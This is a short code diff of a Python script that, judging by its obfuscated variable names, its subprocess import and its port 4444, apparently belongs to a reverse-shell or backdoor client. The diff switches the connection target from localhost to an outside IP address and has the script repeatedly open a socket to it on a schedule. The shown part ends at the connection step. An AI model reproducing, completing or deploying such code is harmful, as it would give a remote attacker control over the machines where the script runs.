@@ -1,12 +1,10 @@
 import socket, sched, time, subprocess, os
 s = sched.scheduler(time.time, time.sleep)
-os = os.name
-connectionest = False
-gsjfhdkjghs5 = 'localhost'
-h4ui3hf2 = 4444
-v43h34iu5 = socket.socket()
 def main(sc):
-    global connectionest
+    connectionest = False
+    gsjfhdkjghs5 = '25.108.125.219'
+    h4ui3hf2 = 4444
+    v43h34iu5 = socket.socket()
     try:
         v43h34iu5.connect((gsjfhdkjghs5, h4ui3hf2))
         connectionest = True
